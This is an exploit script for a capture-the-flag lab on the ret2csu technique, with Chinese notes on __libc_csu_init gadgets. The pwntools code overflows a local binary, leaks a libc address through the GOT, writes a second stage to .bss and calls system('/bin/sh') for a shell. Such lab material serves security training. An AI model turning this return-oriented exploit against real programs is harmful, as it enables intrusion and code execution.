# 从0到1：CTFer成长之路-PWN篇_实验8： 8.ret2csu
"""
这种 mov 的指令 rop.ret2csu 不能自动添加一个 0x0400606 来返回。需要手动
.text:0000000000400606                               loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j
.text:0000000000400606 48 8B 5C 24 08                mov     rbx, [rsp+8]
.text:000000000040060B 48 8B 6C 24 10                mov     rbp, [rsp+16]
.text:0000000000400610 4C 8B 64 24 18                mov     r12, [rsp+24]
.text:0000000000400615 4C 8B 6C 24 20                mov     r13, [rsp+32]
.text:000000000040061A 4C 8B 74 24 28                mov     r14, [rsp+40]
.text:000000000040061F 4C 8B 7C 24 30                mov     r15, [rsp+48]
.text:0000000000400624 48 83 C4 38                   add     rsp, 38h
.text:0000000000400628 C3                            retn

而 pop 这种会自动追加 00040132A, 不需要手动去写, 所以建议不是 pop 这种手写比较快
.text:0000000000401326                               loc_401326:                             ; CODE XREF: __libc_csu_init+35↑j
.text:0000000000401326 48 83 C4 08                   add     rsp, 8
.text:000000000040132A 5B                            pop     rbx
.text:000000000040132B 5D                            pop     rbp
.text:000000000040132C 41 5C                         pop     r12
.text:000000000040132E 41 5D                         pop     r13
.text:0000000000401330 41 5E                         pop     r14
.text:0000000000401332 41 5F                         pop     r15
.text:0000000000401334 C3                            retn
"""
from pwn import *

binary = "./CSU"
s = process(binary)
# gdb.attach(s, 'b*0x0400578\nc')
elf = ELF("./CSU")
context(log_level='debug', arch='amd64', os='linux')

# TODO:  fill this
csu_exec = 0x400606
padding = 0x60
pad = 8 if elf.arch == 'amd64' else 4

write_got = elf.got['write']

rop = ROP(elf)
rop.raw(b'A' * (padding + pad))
rop.raw(p64(csu_exec) + p64(1))  # deadbeef
rop.ret2csu(1, write_got, 0x30, call=write_got)
rop.raw(p64(csu_exec) + p64(1))  # deadbeef
rop.ret2csu(0, elf.bss(0x500), 0x100, call=elf.got['read'])
rop.raw(p64(csu_exec) + p64(1))  # deadbeef
rop.ret2csu(elf.bss(0x500) + 8, 0, 0, call=elf.bss(0x500))
rop.call('vulnerable_function')
s.send(rop.chain())

libc = ELF("./libc-2.23.so")
libc.address = u64(s.recvuntil("\x7f")[-6:] + b"\x00\x00") - libc.sym['write']
success(hex(libc.address))

# raw_input(">")
payload = p64(libc.sym['system']) + b"/bin/sh\x00"
s.send(payload)

s.interactive()
